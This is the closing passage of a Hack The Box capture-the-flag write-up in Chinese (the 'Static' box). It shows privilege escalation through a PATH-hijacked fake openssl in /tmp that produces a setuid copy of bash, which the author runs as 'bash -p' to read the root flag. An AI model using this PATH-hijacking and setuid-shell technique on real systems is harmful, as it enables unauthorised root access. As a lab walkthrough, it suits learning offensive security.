回到另一个环节，与代用工具互动。然后当它试图使用 openssl 时，它将使用我们的版本，因为/tmp 在实际文件所在的/usr/bin 之前的路径列表中。

检查/tmp 文件夹，查看 bash 已被复制到其中，并且 sticky 位已被设置:

```
www-data@pki:/tmp$ ls -lsa
ls -lsa
   4 -rwxr-xr-x 1 www-data www-data      40 Nov  6 19:33 openssl
1088 -rws------ 1 root     www-data 1113504 Nov  6 19:38 bash
```

最后，我们可以升级到 root 并获取标志:

```
www-data@pki:/tmp$ bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cat /root/root.txt
<HIDDEN>
```

那是一个又长又难的盒子，但很有趣，我学到了一些非常值得的东西。我希望你也喜欢。下次见。

如果你喜欢这篇文章，请给我一两个掌声。

推特—【https://twitter.com/pencer_io】T4
网站— [https://pencer.io](https://pencer.io/)

*原载于 2021 年 12 月 19 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-static/)*。*